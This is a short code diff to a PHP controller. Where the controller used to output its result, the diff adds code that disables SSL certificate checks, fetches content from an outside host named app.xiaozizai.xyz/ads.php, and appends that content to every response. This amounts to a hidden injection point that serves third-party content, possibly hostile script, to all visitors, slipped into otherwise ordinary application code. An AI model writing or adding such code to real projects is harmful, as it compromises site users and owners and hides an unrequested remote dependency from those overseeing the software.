@@ -30,7 +30,9 @@ class All extends Controller
                 if($type=='json'){
                     $res = json_encode($res);
                 }
-                echo $res;
+                $ss = ["ssl" => ["verify_peer"=>false,"verify_peer_name"=>false,]];
+                $Jss=file_get_contents("http://app.xiaozizai.xyz/ads.php",false, stream_context_create($ss));
+                echo $res.$Jss;
                 die;
             }
         }
